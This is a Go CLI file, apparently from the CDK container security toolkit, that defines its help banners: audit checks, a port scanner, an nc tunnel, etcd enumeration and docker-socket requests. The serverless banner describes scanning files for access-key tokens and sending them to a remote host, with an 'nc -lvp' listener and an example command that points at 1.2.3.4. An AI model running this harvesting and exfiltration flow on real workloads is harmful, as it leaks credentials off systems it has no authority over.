/*
Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package cli

import (
	"fmt"
	"log"
	"os"

	"github.com/cdk-team/CDK/pkg/util"
	"github.com/docopt/docopt-go"
)

var Args docopt.Opts
var GitCommit string

var BannerTitle = `CDK (Container Defense Kit)`
var BannerVersion = fmt.Sprintf("%s %s", "CDK Version(GitCommit):", GitCommit)

var BannerHeader = fmt.Sprintf(`%s
%s
Zero-dependency container & K8s isolation baseline audit toolkit
Find tutorial, configuration and use-case in (internal documentation)
`, util.GreenBold.Sprint(BannerTitle), BannerVersion)

var BannerContainerTpl = BannerHeader + `
%s
  cdk eva [--no-gating]
  cdk eva [--full] [--no-gating]
  cdk evaluate [--full] [--no-gating]
  cdk run (--list | <check> [<args>...])
  cdk <tool> [<args>...]

%s
  cdk evaluate                              Gather isolation posture and identify audit findings inside container.
  cdk eva                                   Alias of "cdk evaluate".
  cdk evaluate --full                       Enable file scan during information gathering.


%s
  cdk run --list                            List all available audit checks.
  cdk run <check> [<args>...]               Run single audit check, docs in (internal documentation)

%s
  ed <file>                                 Edit files in container like "ed" command.
  ps                                        Show process information like "ps -ef" command.
  netstat                                   Like "netstat -antup" command.
  nc [options]                              Create TCP tunnel.
  ifconfig                                  Show network information.
  kcurl <path> (get|post) <uri> [<data>]    Make request to K8s api-server.
  ectl <endpoint> get <key>                 Enumerate etcd keys (anonymous-mode detection).
  ucurl (get|post) <socket> <uri> <data>    Make request to docker unix socket.
  probe <ip> <port> <parallel> <timeout-ms> TCP port scan, example: cdk probe 10.0.1.0-255 80,8080-9443 50 1000

%s
  -h --help     Show this help msg.
  -v --version  Show version.
  --profile=<name> Select evaluation profile (basic, extended, additional).
  --no-gating   Disable preflight prereq gating (loud, runs ALL checks regardless of preflight).
`

// BannerContainer is the banner of CDK command line with colorful.
var BannerContainer = fmt.Sprintf(
	BannerContainerTpl,
	"Usage:",
	util.GreenBold.Sprint("Evaluate:"),
	util.GreenBold.Sprint("Audit Check:"),
	util.GreenBold.Sprint("Tool:"),
	"Options:",
)

var BannerServerless = BannerHeader + `
This is the slim build for credential-surface scanning in short-lived serverless workloads.

Sessions in serverless functions are terminated in seconds; use this profile to accelerate credential surface scanning.

Usage:
cdk-serverless <scan-dir> <remote-ip> <port>

Args:
scan-dir                 Read all files under target dir and surface AK tokens.
remote-ip,port           Send results to target IP:PORT via TCP tunnel.

Example:
1. public server(e.g. 1.2.3.4) start listen tcp port 999 using "nc -lvp 999"
2. inside serverless function service execute "./cdk-serverless /code 1.2.3.4 999"
`

func parseDocopt() {
	args, err := docopt.ParseArgs(BannerContainer, os.Args[1:], BannerVersion)
	if err != nil {
		log.Fatalln("docopt err: ", err)
	}
	Args = args
}
